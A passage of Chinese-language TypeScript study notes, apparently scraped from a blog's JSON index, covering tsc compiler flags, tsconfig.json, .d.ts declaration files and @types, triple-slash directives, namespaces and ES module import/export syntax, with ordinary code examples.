禁止对同一个文件的不一致的引用 –-inlineSourceMap boolean false 生成单个 sourcemaps 文件，而不是将每 sourcemaps 生成不同的文件 –-inlineSources boolean false 将代码与 sourcemaps 生成到一个文件中，要求同时设置了 --inlineSourceMap 或 --sourceMap 属性 --init 初始化 TypeScript 项目并创建一个 tsconfig.json 文件 –-listEmittedFiles boolean false 打印出编译后生成文件的名字 –-listFiles boolean false 编译过程中打印文件名 --module -m string target == &quot;ES6&quot; ? &quot;ES6&quot; : &quot;commonjs&quot; 指定生成哪个模块系统代码： &quot;None&quot;、&quot;CommonJS&quot;、&quot;AMD&quot;、&quot;System&quot;、&quot;UMD&quot;、&quot;ES6&quot; 或 &quot;ES2015&quot;。► 只有 &quot;AMD&quot; 和 &quot;System&quot; 能和 --outFile 一起使用。► &quot;ES6&quot; 和 &quot;ES2015&quot; 可使用在目标输出为 &quot;ES5&quot; 或更低的情况下。 --moduleResolution string module == &quot;AMD&quot; or &quot;System&quot; or &quot;ES6&quot; ? &quot;Classic&quot; : &quot;Node&quot; 决定如何处理模块 --noEmit boolean false 不生成输出文件 --noEmitHelpers boolean false 不在输出文件中生成用户自定义的帮助函数代码，如 __extends。 --noEmitOnError boolean false 报错时不生成输出文件 --noErrorTruncation boolean false 不截短错误消息 --noFallthroughCasesInSwitch boolean false 报告 switch 语句的 fallthrough 错误（即不允许 switch 的 case 语句贯穿） --noImplicitAny boolean false 在表达式和声明上有隐含的 any 类型时报错。 --noImplicitReturns boolean false 当不是函数的所有返回路径都有返回值时报错 --noImplicitThis boolean false 当 this 表达式的值为 any 类型时生成一个错误 --noImplicitUseStrict boolean false 模块输出中不包含 &quot;use strict&quot; 指令 --noLib boolean false 不包含默认的库文件（ lib.d.ts） --noResolve boolean false 不把 /// &lt;reference&gt; 或模块导入的文件加到编译文件列表 --noStrictGenericChecks boolean false 禁用在函数类型里对泛型签名进行严格检查 --noUnusedLocals boolean false 若有未使用的局部变量则抛错 --noUnusedParameters boolean false 若有未使用的参数则抛错 --outDir string 重定向输出目录 –-outFile string 将输出文件合并为一个文件，合并的顺序是根据传入编译器的文件顺序和 ///&lt;reference&gt; 和 import 的文件顺序决定的。 --preserveConstEnums boolean false 保留 const enum 声明 --preserveSymlinks boolean false 不把符号链接解析为其真实路径；将符号链接文件视为真正的文件 --preserveWatchOutput boolean false 保留 watch 模式下过时的控制台输出 --project -p string 编译指定目录下的项目，这个目录应该包含一个 tsconfig.json文件来管理编译 --removeComments boolean false 删除所有注释，除了以 /!* 开头的版权信息 –-skipDefaultLibCheck boolean false 忽略库的默认声明文件的类型检查 –-skipLibCheck boolean false 忽略所有的声明文件（ *.d.ts ）的类型检查 --sourceMap boolean false 生成相应的 .map 文件 --sourceRoot string 指定 TypeScript 源文件的路径，以便调试器定位。当 TypeScript 文件的位置是在运行时指定时使用此标记，路径信息会被加到 sourceMap 里。 --strict boolean false 启用所有严格类型检查选项，相当于启用 --noImplicitAny、--noImplicitThis、--alwaysStrict、--strictNullChecks、--strictFunctionTypes 和 --strictPropertyInitialization。 --strictFunctionTypes boolean false 禁用函数参数双向协变检查 --strictPropertyInitialization boolean false 确保类的非 undefined 属性已经在构造函数里初始化，需要同时启用 --strictNullChecks。 --strictNullChecks boolean false 在严格的 null 检查模式下，null 和 undefined 值不包含在任何类型里，只允许用它们自己和 any 来赋值（有个例外，undefined 可以赋值到 void）。 --target -t string ES3 指定 ECMAScript 目标版本 ES3（默认）、ES5、ES6/ ES2015、ES2016、ES2017 或 ESNext。注意：ESNext 最新的生成目标列表为 ES proposed features。 --traceResolution boolean false 生成模块解析日志信息 --types string[] 要包含的类型声明文件名列表 --typeRoots string[] 要包含的类型声明文件路径列表 –-watch -w 在监视模式下运行编译器，会监视输出文件，在它们改变时重新编译。监视文件和目录的具体实现可以通过环境变量进行配置。 tsconfig.json 可以通过 tsc --init 命令在根目录生成 tsconfig.json 文件。 目录中存在 tsconfig.json 文件表示该目录是 TypeScript 项目的根目录。 tsconfig.json 文件指定编译项目所需的根文件和编译器选项，主要有以下配置项： { &quot;compilerOptions&quot;: {}, &quot;files&quot;: [ &quot;core.ts&quot;, &quot;index.ts&quot;, &quot;types.ts&quot; ], &quot;exclude&quot;: [ &quot;node_modules&quot;, &quot;lib&quot;, &quot;**/*.test.ts&quot; ], &quot;include&quot;: [ &quot;src/**/*&quot; ], &quot;extends&quot;: &quot;@tsconfig/recommended/tsconfig.json&quot; } compilerOptions - 对象类型，用来设置编译选项，若不设置则默认使用上述编译选项的默认配置。 files - 指定一个包含相对或绝对文件路径的列表，不支持 glob 匹配模式。 include - 指定一个文件 glob 匹配模式列表。 exclude - 排除一个文件 glob 匹配模式列表。 extends - 字符串类型，指向另一个要继承的配置文件的路径。例如，可以继承一个推荐配置 npm i @tsconfig/recommended，&quot;extends&quot;: &quot;@tsconfig/recommended/tsconfig.json&quot;。 如果有同名配置，继承文件里的配置会覆盖源文件里的配置。 配置文件里的相对路径在解析时相对于它所在的文件。 glob 通配符有: * 匹配 0 或多个字符（不包括目录分隔符） ? 匹配一个任意字符（不包括目录分隔符） **/ 递归匹配任意子目录 如果一个 glob 模式里的某部分不包含文件扩展名（只包含 * 或 .*），那么仅有支持的文件扩展名类型被包含在内（默认情况下为 .ts、.tsx 和 .d.ts），如果 allowJs 设置为 true，也包括 .js 和 .jsx。 如果 files 和 include 都没有被指定，编译器默认包含当前目录和子目录下所有的 TypeScript 文件（.ts、.tsx 和 .d.ts），排除在 exclude 里指定的文件。 如果同时指定了 files 或 include，编译器会将它们结合一并包含进来。 使用 include 引入的文件可以使用 exclude 属性过滤。然而，通过 files 属性明确指定的文件却总是会被包含在内，不管 exclude 如何设置。 使用 outDir 指定的目录下的文件永远会被编译器排除，除非明确地使用 files 将其包含进来（这时就算用 exclude 指定也没用）。 如果没有特殊指定，exclude 默认情况下会排除 node_modules、bower_components、jspm_packages 和 outDir 目录。 任何被 files 或 include 指定的文件所引用的文件也会被包含进来。例如，A.ts 引用了 B.ts，因此 B.ts 不能被排除，除非引用它的 A.ts 在 exclude 列表中。 编译器不会去引入那些可能作为输出的文件。例如，我们包含了 index.ts，那么 index.d.ts 和 index.js 会被排除在外。 优先级：命令行配置 &gt; files &gt; exclude &gt; include。 declaration 用来为工程中的每个 TypeScript 或 JavaScript 文件生成 .d.ts 文件，这些 .d.ts 文件是描述模块外部 API 的类型定义文件。编辑工具可以通过 .d.ts 文件为非类型化的代码提供 intellisense 和精确的类型。 当 declaration 设置为 true 时，用编译器执行下面的 TypeScript 代码： export let helloWorld = &quot;hi&quot;; 将会生成如下这样的 index.js 文件： export let helloWorld = &quot;hi&quot;; 以及一个相应的 helloWorld.d.ts： export declare let helloWorld: string; 当使用 .d.ts 文件处理 JavaScript 文件时，需要使用 emitDeclarationOnly 或 outDir 来确保 JavaScript 文件不会被覆盖。 strictFunctionTypes 协变：允许子类型转换为父类型(可以里式替换 LSP 原则进行理解)。 逆变：允许父类型转换为子类型。 在函数的参数类型中，是符合逆变的，函数的关系和参数的关系是相反的。 在老版本的 TS 中，函数参数是双向协变的。也就是说，既可以协变又可以逆变，但是这并不是类型安全的。 在新版本 TS(2.6+)中 ，可以通过开启 strictFunctionTypes 来修复这个问题。设置之后，函数参数就不再是双向协变的了，函数参数检查更正确。 下面是一个禁用 strictFunctionTypes 的示例： // @strictFunctionTypes: false function fn(x: string) { console.log(&quot;Hello, &quot; + x.toLowerCase()); } type StringOrNumberFunc = (ns: string | number) =&gt; void; // Unsafe assignment let func: StringOrNumberFunc = fn; // Unsafe call - will crash func(10); 启用 strictFunctionTypes 后，将正确检测到错误： // @strictFunctionTypes: true function fn(x: string) { console.log(&quot;Hello, &quot; + x.toLowerCase()); } type StringOrNumberFunc = (ns: string | number) =&gt; void; // Unsafe assignment let func: StringOrNumberFunc = fn; // Type '(x: string) =&gt; void' is not assignable to type 'StringOrNumberFunc'. // Types of parameters 'x' and 'ns' are incompatible. // Type 'string | number' is not assignable to type 'string'. // Type 'number' is not assignable to type 'string'. 在此功能的开发过程中，发现了大量本质上不安全的类层次结构，包括 DOM 中的一些。因此，该设置仅适用于以函数语法编写的函数，不适用于方法语法中的函数： // @strictFunctionTypes: true type Methodish = { func(x: string | number): void; }; function fn(x: string) { console.log(&quot;Hello, &quot; + x.toLowerCase()); } // Ultimately an unsafe assignment, but not detected const m: Methodish = { func: fn, }; m.func(10); typeAcquisition 对象类型，用以设置自动引入库类型定义文件（.d.ts），该属性下面有3个子属性： enable: 布尔类型，用以设置是否开启自动引入库类型定义文件 include: 数组类型，允许自动引入的库名列表，如 [&quot;jquery&quot;, &quot;kendo-ui&quot;] exclude: 数组类型，排除的库名列表 代码提示的秘密 - d.ts 在使用 TypeScript 的时候，最大的一个好处就是可以给 JS 各种类型约束，使得 JS 能够完成静态代码分析，推断代码中存在的类型错误或者进行类型提示。 而 TypeScript 完成类型推断，需要事先知道变量的类型，如果我们都是用 TypeScript 书写代码，并且给变量都指定了明确的类型，TypeScript 是可以很好的完成类型推断工作的。 但是有时，我们不免会引入外部的 JS 库，这时 TypeScript 就对引入的 JS 文件里变量的具体类型不明确了，为了告诉 TypeScript 变量的类型，因此就有了类型定义文件 d.ts（d 即 declare），TypeScript 的声明文件。 如何让这些第三方库也可以进行类型推导呢？需要考虑如何让 JS 库也能定义静态类型。JavaScript 和 TypeScript 的静态类型交叉口 — 类型定义文件，类似于 C/C++ 的 .h头文件（#include &lt;stdio.h&gt;），轻松让 JavaScript 也能支持定义静态类型。 d.ts 文件用于为 TypeScript 提供有关用 JavaScript 编写的 API 的类型信息。简单讲，就是你可以在 ts 文件中调用的 js 文件的声明文件。 TypeScript 的核心在于静态类型，我们在编写 TS 的时候会定义很多的类型，但是主流的库都是 JS 编写的，并不支持类型系统。这个时候你不能用 TS 重写主流的库，我们只需要编写仅包含类型注释的 d.ts 文件，然后在你的 TS 代码中，可以在仍然使用纯 JS 库的同时，获得静态类型检查的优势。 在此期间，解决的方式经过了许多的变化，从 DefinitelyTyped 到 typings（已停止维护）。最后是 @types。在 Typescript 2.0 之后，推荐使用 @types 方式，TypeScript 将会默认地检查 ./node_modules/@types 文件夹，自动从这里来获取模块的类型定义，当然了，你需要独立安装这个类型定义。Microsoft 在 The Future of Declaration Files 介绍了 TypeScript 的这个新特性。 类型路径 - @types 默认情况下，所有的 @types 包都会在编译时应用，任意层的 node_modules/@types 都会被使用，进一步说，在 node_modules/@types 中的任何包都被认为是可见的，这意味着包含了 ./node_modules/@types/、../node_modules/@types/、../../node_modules/@types/ 中所有的包。 如果你的类型定义不在上面这个默认文件夹中，可以使用 typesRoot 来配置，只有 typeRoots 下面的包才会被包含进来。例如： { &quot;compilerOptions&quot;: { &quot;typeRoots&quot;: [&quot;./typings&quot;, &quot;./vendor/types&quot;] } } 这个配置文件将包含 ./typings 和 ./vendor/types 下的所有包，而不包括 ./node_modules/@types 下的。其中所有的路径都是相对于 tsconfig.json。 当 types 被指定，则只有列出的包才会被包含在全局范围内。例如： { &quot;compilerOptions&quot;: { &quot;types&quot;: [&quot;node&quot;, &quot;jest&quot;, &quot;express&quot;] } } 这个配置文件将只会包含 ./node_modules/@types/node、./node_modules/@types/jest 和 ./node_modules/@types/express。其他在 node_modules/@types/* 下的包将不会被包含。此功能与 typeRoots 不同的是，它只指定你想要包含的具体类型，而 typeRoots 支持你想要特定的文件夹。 可以指定 &quot;types&quot;: [] 来禁用自动引入 @types 包。自动引入只在你使用了全局的声明（相反于模块）时是重要的，如果你使用 import &quot;foo&quot; 语句，TypeScript 仍然会查找 node_modules 和 node_modules/@types 文件夹来获取 foo 包。 types 选项不会影响 @types/* 如何被包含在你的代码中，例如： import * as moment from &quot;moment&quot;; moment().format(&quot;MMMM Do YYYY, h:mm:ss a&quot;); moment 导入会有完整的类型。当你设置了不在 types 数组中包含它们时，它将： 不会在你的项目中添加全局声明（例如 node 中的 process 或 Jest 中的 expect）。 导出不会出现在自动导入的建议中。 d.ts 和 @types 的关系 @types 是 npm 的一个分支，用来存放 d.ts 文件，如果对应的 npm 包存放在 @types 中，要使用必须下载！如果是自己本地的 d.ts 申明文件，则和 @types 没有任何关系！ 实验 以下 baby.ts 文件，导出了一个 Baby 类，和一个叫 baby 的实例。Baby 包含一个私有的字段 _name，静态的方法 smile，公开的方法 getBabyName, 在通过 new 调用 constructor 的时候，会初始化我们的 _name，而 getBabyName 就是拿到我们私有的 _name，之所以需要 getBabyName，是因为通过 private 关键字指定的私有字段和方法，在实例中是无法访问的。 export class Baby { private _name: string; constructor(name: string) { this._name = name; console.log('小宝贝正在哭泣，哇哇哇哇哇~~~') } static smile() { console.log('O(∩_∩)O哈！') } getBabyName(): string { return this._name; } } export let baby = new Baby('Nico'); 我们加上 -d 选项编译 ts 文件： tsc baby.ts -d 会有一个编译后的 baby.js 文件，你还会发现我们多出了一个 baby.d.ts 文件。大多数 ts 初学者会这样问：请问一下，如何在 ts 文件里面，引入已经写好的 js 文件呢？答案就在这里，d.ts 文件。 export declare class Baby { private _name; constructor(name: string); static smile(): void; getBabyName(): string; } export declare let baby: Baby; 我们发现 baby.ts 里面所有的方法声明都被导入到了 baby.d.ts 文件里面，而 TypeScript 恰恰就是通过这个 d.ts 文件进行代码提示的。 现在重命名一下我们的 baby.ts，把它改成 baby.copy.ts。 新建 main.ts 文件，当使用 import { baby } from &quot;./baby&quot;; 语句导入的时候，VSCode 会自动提示 baby.d.ts 和 baby.copy.ts。 我们选择 baby.d.ts（baby.js 模块文件的声明文件），然后再敲 baby.，此时我们就看到了 getBabyName 方法的提示。 如果删除 baby.d.ts 文件，会发现提示警告：无法找到模块“./baby”的声明文件。“baby.js”隐式拥有 &quot;any&quot; 类型。 添加自己的 typings 文件夹 如何解决没有库的 d.ts 文件时报错？ 添加 typeRoots 配置项，就可以加载自己的 d.ts 文件了。 { &quot;compilerOptions&quot;: { &quot;typeRoots&quot;: [&quot;typings&quot;] } } 在 typings 目录下新建一个 xxx.d.ts ，xxx 可以随意写。 declare module &quot;koa&quot; { interface Context { render(filename: string, ...args: any[]) : any; session: any; i18n: any; csrf: any; flash: any; } } &quot;koa&quot; 就是你的报错库的名称，这里就只是给 koa 库添加一些属性，防止代码编辑器报错。 还有一点要注意的是，报错一定是因为该包主目录下没有一个 index.js，或者放到 lib 目录下面了，新版本的 TypeScript 只要你安装了库，并且它的下面有 index.js 就可以加载到，不会报错但是会让你导入的是 any 类型。 如何发布 d.ts 文件 第一种方式就是在你的库下面的 package.json 里面配置。这里最好写上相对路径： &quot;types&quot;: &quot;./lib/main.d.ts&quot; // or &quot;typings&quot;: &quot;./lib/main.d.ts&quot; 如果你的项目没有使用模块系统的话，可以将包中包含类型定义的 .d.ts 文件手动通过 /// &lt;reference path=&quot;&quot; /&gt; 引入。 第二种方式是给这个地址提交 PR。 https://github.com/DefinitelyTyped/DefinitelyTyped.git 最近的构建都具有完善的 类型标注： 所有的包基于 typescript@next 版本都有完善的类型标注： 所有的包都会在1小时30分钟内 发布到 npm: typescript-bot 在 Definitely Typed 一直处于活跃状态 Definitely Typed 是一个高质量的 TypeScript 类型定义的仓库。 npm 包中并不总是有可用的类型，可能有时项目不再维护，有时他们不感兴趣，或没有时间使用 TypeScript。 由于缺少类型，在 TypeScript 中使用非类型化 npm 包将不会再具有类型安全性。 为了帮助 TypeScript 开发人员使用这些包，有一个社区维护的项目叫做 Definitely Typed。 Definitely Typed 是一个为没有类型的 NPM 包提供类型脚本定义的中央存储库的项目。 安装声明包后，通常不需要其他步骤来使用类型，TypeScript 会在使用包本身时自动选择类型。 npm install --save-dev @types/jquery npm install --save-dev @types/node 编译器中会自动引入这些类型。如果你的项目没有使用模块系统的话，你可能需要使用 types 指令进行手动引用： /// &lt;reference types=&quot;node&quot; /&gt; 当缺少类型时，VSCode 等编辑器通常会建议安装此类包。对于 npm 包 &quot;foo&quot;，它的类型定义的包名应该是 &quot;@types/foo&quot;。如果没有找到你的包，请在 TypeSearch 查询。 Definitely Typed 和 npm 上的 @types 包有什么关系？Definitely Typed GitHub 仓库 master 分支 会通过 DefinitelyTyped-tools 自动发布到 npm 上的 @types。 ","link":"https://zkrisj.github.io/post/typescript-bian-yi-xuan-xiang-sheng-ming-wen-jian-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 命名空间、模块、声明合并 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 三斜杠指令 三斜杠指令是包含单个 XML 标记的单行注释，注释的内容会做为编译器指令使用。 三斜线指令仅可放在包含它的文件的最顶端。一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。如果它们出现在一个语句或声明之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。 /// &lt;reference path=&quot;...&quot; /&gt; /// &lt;reference path=&quot;...&quot; /&gt; 引用指令是三斜线指令中最常见的一种，它用于声明文件间的依赖，告诉编译器在编译过程中要引入的额外的文件。 当使用 --out 或 --outFile 时，它也可以做为调整输出内容顺序的一种方法，文件在输出文件内容中的位置与经过预处理后的输入顺序一致。 编译器会对输入文件进行预处理来解析所有三斜线引用指令。在这个过程中，额外的文件会加到编译过程中，该过程从一组 根文件 开始；这些文件是在命令行中指定或是在 tsconfig.json 中的 &quot;files&quot; 列表里指定；这些 根文件 按指定的顺序进行预处理。在一个文件被加入列表前，它包含的所有三斜线引用都要被处理，还有它们包含的目标。三斜线引用以它们在文件里出现的顺序，使用深度优先的方式解析。 一个三斜线引用路径是相对于包含它的文件的，如果不是根文件。引用不存在的文件会报错，一个文件用三斜线指令引用自己也会报错。 如果指定了 noResolve 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。 /// &lt;reference types=&quot;...&quot; /&gt; 与 /// &lt;reference path=&quot;...&quot; /&gt; 指令类似，三斜线类型引用指令是用来声明 依赖 的；一个 /// &lt;reference types=&quot;...&quot; /&gt; 指令则声明了对某个包的依赖。 对这些包的名字的解析与在 import 语句里对模块名的解析类似。可以简单地把三斜线类型引用指令当做 import 声明包的一种简单方法。 例如，把 /// &lt;reference types=&quot;node&quot; /&gt; 引入到声明文件，表明这个文件使用了 @types/node/index.d.ts 里面声明的名字；并且，这个包需要在编译阶段与声明文件一起被包含进来。 仅当在你需要写一个 d.ts 文件时才使用这个指令。 对于那些在编译阶段生成的声明文件，编译器会自动地添加 /// &lt;reference types=&quot;...&quot; /&gt;；当且仅当 结果文件中使用了引用的包里的声明时才会在生成的声明文件里添加 /// &lt;reference types=&quot;...&quot; /&gt; 语句。 若要在 .ts 文件里声明一个对 @types 包的依赖，使用 --types 命令行选项或在 tsconfig.json 里指定 types。 通过指令包含的方式，假如我们每一个文件都写一个这种指令，会非常的烦，所以可以在 tsconfig.json 里面配置，分别是 types 指定文件，typeRoots 指定目录，选择一样即可。 /// &lt;reference no-default-lib=&quot;true&quot;/&gt; 这个指令把一个文件标记成 默认库。你会在 lib.d.ts 文件和它不同的变体的顶部看到这个注释。 这个指令告诉编译器在编译过程中不要包含默认库（即 lib.d.ts）。这与在命令行上使用 --noLib 相似。 还要注意，当传递了 --skipDefaultLibCheck 时，编译器只会忽略检查带有 /// &lt;reference no-default-lib=&quot;true&quot;/&gt; 的文件。 命名空间 TypeScript 1.5 里术语名已经发生了变化。“内部模块”现在称做“命名空间”。“外部模块”现在则简称为“模块”，这是为了与 ECMAScript 2015 里的术语保持一致。另外，任何使用 module 关键字来声明一个内部模块的地方都应该使用 namespace 关键字来替换，这就避免了让新的使用者被相似的名称所迷惑。 我们定义几个简单的字符串验证器，使用它们来验证表单里的用户输入或验证外部数据。 所有的验证器都放在一个文件里。 interface StringValidator { isAcceptable(s: string): boolean; } let lettersRegexp = /^[A-Za-z]+$/; let numberRegexp = /^[0-9]+$/; class LettersOnlyValidator implements StringValidator { isAcceptable(s: string) { return lettersRegexp.test(s); } } class ZipCodeValidator implements StringValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } let strings = [&quot;Hello&quot;, &quot;98052&quot;, &quot;101&quot;]; // 使用的验证器 let validators: { [s: string]: StringValidator } = {}; validators[&quot;ZIP code&quot;] = new ZipCodeValidator(); validators[&quot;Letters only&quot;] = new LettersOnlyValidator(); for (let s of strings) { for (let name in validators) { let isMatch = validators[name]!.isAcceptable(s); console.log(`'${s}' ${isMatch ? &quot;matches&quot; : &quot;does not match&quot;} '${name}'.`); } } 随着更多验证器的加入，我们需要一种手段来组织代码，以便于在记录它们类型的同时还不用担心与其它对象产生命名冲突。因此，我们把验证器包裹到一个命名空间内，而不是把它们放在全局命名空间下。下面我们把所有与验证器相关的类型都放到一个叫做 Validation 的命名空间里。因为我们想让这些接口和类在命名空间之外也是可访问的，所以需要使用 export。相反的，变量 lettersRegexp 和 numberRegexp 是实现的细节，不需要导出，因此它们在命名空间外是不能访问的。在文件末尾的测试代码里，由于是在命名空间之外访问，因此需要限定类型的名称，比如 Validation.LettersOnlyValidator。 namespace Validation { export interface StringValidator { isAcceptable(s: string): boolean; } const lettersRegexp = /^[A-Za-z]+$/; const numberRegexp = /^[0-9]+$/; export class LettersOnlyValidator implements StringValidator { isAcceptable(s: string) { return lettersRegexp.test(s); } } export class ZipCodeValidator implements StringValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } } let strings = [&quot;Hello&quot;, &quot;98052&quot;, &quot;101&quot;]; // 使用的验证器 let validators: { [s: string]: Validation.StringValidator } = {}; validators[&quot;ZIP code&quot;] = new Validation.ZipCodeValidator(); validators[&quot;Letters only&quot;] = new Validation.LettersOnlyValidator(); for (let s of strings) { for (let name in validators) { console.log( `&quot;${s}&quot; - ${validators[name]!.isAcceptable(s) ? &quot;matches&quot; : &quot;does not match&quot; } '${name}'` ); } } 当应用变得越来越大时，我们需要将代码分离到不同的文件中以便于维护。现在，我们把 Validation 命名空间分割成多个文件。尽管是不同的文件，它们仍是同一个命名空间，并且在使用的时候就如同它们在一个文件中定义的一样。因为不同文件之间存在依赖关系，所以我们加入了引用标签来告诉编译器文件之间的关联。 Validation.ts namespace Validation { export interface StringValidator { isAcceptable(s: string): boolean; } } LettersOnlyValidator.ts /// &lt;reference path=&quot;Validation.ts&quot; /&gt; namespace Validation { const lettersRegexp = /^[A-Za-z]+$/; export class LettersOnlyValidator implements StringValidator { isAcceptable(s: string) { return lettersRegexp.test(s); } } } ZipCodeValidator.ts /// &lt;reference path=&quot;Validation.ts&quot; /&gt; namespace Validation { const numberRegexp = /^[0-9]+$/; export class ZipCodeValidator implements StringValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } } Test.ts /// &lt;reference path=&quot;Validation.ts&quot; /&gt; /// &lt;reference path=&quot;LettersOnlyValidator.ts&quot; /&gt; /// &lt;reference path=&quot;ZipCodeValidator.ts&quot; /&gt; let strings = [&quot;Hello&quot;, &quot;98052&quot;, &quot;101&quot;]; let validators: { [s: string]: Validation.StringValidator } = {}; validators[&quot;ZIP code&quot;] = new Validation.ZipCodeValidator(); validators[&quot;Letters only&quot;] = new Validation.LettersOnlyValidator(); for (let s of strings) { for (let name in validators) { console.log( `&quot;${s}&quot; - ${ validators[name].isAcceptable(s) ? &quot;matches&quot; : &quot;does not match&quot; } ${name}` ); } } 当涉及到多文件时，我们必须确保所有编译后的代码都被加载了。我们有两种方式。 第一种方式，把所有的输入文件编译为一个输出文件，需要使用 --outFile 标记： tsc --outFile sample.js Test.ts 编译器会根据源码里的引用标签自动地对输出进行排序。你也可以单独地指定每个文件。 tsc --outFile sample.js Validation.ts LettersOnlyValidator.ts ZipCodeValidator.ts Test.ts 第二种方式，我们可以使用按文件编译（默认）为每个输入文件生成一个 JavaScript 文件。然后，在页面上通过 &lt;script&gt; 标签把所有生成的 JavaScript 文件按正确的顺序引进来。 &lt;!-- MyTestPage.html --&gt; &lt;script src=&quot;Validation.js&quot; type=&quot;text/javascript&quot; /&gt; &lt;script src=&quot;LettersOnlyValidator.js&quot; type=&quot;text/javascript&quot; /&gt; &lt;script src=&quot;ZipCodeValidator.js&quot; type=&quot;text/javascript&quot; /&gt; &lt;script src=&quot;Test.js&quot; type=&quot;text/javascript&quot; /&gt; 另一种简化命名空间操作的方法是使用 import q = x.y.z 给常用的对象起一个短的名字。注意不要与用来加载模块的 import x = require('name') 语法弄混了，这里的语法是为指定的符号创建一个别名。你可以用这种方法为任意标识符创建别名，也包括导入的模块中的对象。 namespace Shapes { export namespace Polygons { export class Triangle {} export class Square {} } } import polygons = Shapes.Polygons; let sq = new polygons.Square(); // Same as 'new Shapes.Polygons.Square()' 注意，我们并没有使用 require 关键字，而是直接使用导入符号的限定名赋值。这与使用 var 相似，但它还适用于导入符号的类型和命名空间含义。重要的是，对于值来讲，import 会生成与原始符号不同的引用，所以改变别名的值并不会影响原始变量的值。 为了描述不是用 TypeScript 编写的类库的类型，我们需要声明类库导出的 API。由于大部分 JavaScript 库只提供少数的顶级对象，所以命名空间是表示它们的好方法。我们叫它声明因为它不是“外部程序”的具体实现。它们通常是在 .d.ts 文件里定义的。如果你熟悉 C/C++，你可以把它们当做 .h 文件。例如流行的程序库 D3 在全局对象 d3 里定义它的功能。因为这个库通过一个 &lt;script&gt; 标签加载（不是通过模块加载器），它的声明文件使用内部模块来定义它的类型。为了让 TypeScript 编译器识别它的类型，我们使用外部命名空间声明。 // D3.d.ts（简化） declare namespace D3 { export interface Selectors { select: { (selector: string): Selection; (element: EventTarget): Selection; }; } export interface Event { x: number; y: number; } export interface Base extends Selectors { event: Event; } } declare var d3: D3.Base; 模块 从 ECMAScript 2015 开始，JavaScript 有了模块的概念。TypeScript 与 es6 的模块基本是一致的。 TypeScript 与 ECMAScript 2015 一样，任何包含顶级 import 或者 export 的文件都被当成一个模块。 相反地，如果一个文件不带有顶级的 import 或者 export 声明，那么它的内容被视为全局可见的（因此对模块也是可见的）。 导出 导出声明 任何声明（例如变量、函数、类、类型别名或接口）都可以通过添加 export 关键字来导出。 // StringValidator.ts export interface StringValidator { isAcceptable(s: string): boolean; } // ZipCodeValidator.ts import { StringValidator } from &quot;./StringValidator&quot;; export const numberRegexp = /^[0-9]+$/; export class ZipCodeValidator implements StringValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } 导出语句 当我们需要对导出的部分重命名时，导出语句很方便，所以上面的例子可以这样改写： class ZipCodeValidator implements StringValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } export { ZipCodeValidator }; export { ZipCodeValidator as mainValidator }; 重新导出 我们经常会去扩展其它模块，并且只导出那个模块的部分内容。重新导出功能并不会在当前模块导入那个模块或定义一个新的局部变量。 // ParseIntBasedZipCodeValidator.ts export class ParseIntBasedZipCodeValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; parseInt(s).toString() === s; } } // 导出原先的验证器但做了重命名 export { ZipCodeValidator as RegExpBasedZipCodeValidator } from &quot;./ZipCodeValidator&quot;; 或者一个模块可以包裹多个模块，并把他们导出的内容联合在一起通过语法：export * from &quot;module&quot;。 // AllValidators.ts export * from &quot;./StringValidator&quot;; // exports 'StringValidator' interface export * from &quot;./ZipCodeValidator&quot;; // exports 'ZipCodeValidator' class and 'numberRegexp' constant value export * from &quot;./ParseIntBasedZipCodeValidator&quot;; // exports the 'ParseIntBasedZipCodeValidator' class // and re-exports 'RegExpBasedZipCodeValidator' as alias // of the 'ZipCodeValidator' class from 'ZipCodeValidator.ts' module. 导入 导入一个模块中的单个导出内容 import { ZipCodeValidator } from &quot;./ZipCodeValidator&quot;; let myValidator = new ZipCodeValidator(); 导入也可以重命名： import { ZipCodeValidator as ZCV } from &quot;./ZipCodeValidator&quot;; let myValidator = new ZCV(); 将整个模块导入到单个变量中 import * as validator from &quot;./ZipCodeValidator&quot;; let myValidator = new validator.ZipCodeValidator(); 仅为副作用导入模块 一些模块会设置一些全局状态供其它模块使用。这些模块可能没有任何的导出或用户根本就不关注它的导出。 import &quot;./my-module.js&quot;; 导入类型 从 TypeScript 3.8，可以使用 import 语句或使用 import type 导入类型。 import { APIResponseType } from &quot;./api&quot;; // 显式使用导入类型 import type { APIResponseType } from &quot;./api&quot;; // 显式导入一个值（getResponse）和一个类型（APIResponseType） import { getResponse, type APIResponseType} from &quot;./api&quot;; 默认导出 每个模块都可以有一个 default 导出。 默认导出使用 default 关键字标记；并且一个模块只能够有一个 default 导出。 比如，像 JQuery 这样的类库可能有一个默认导出 jQuery 或 $，并且我们基本上也会使用同样的名字 jQuery 或 $ 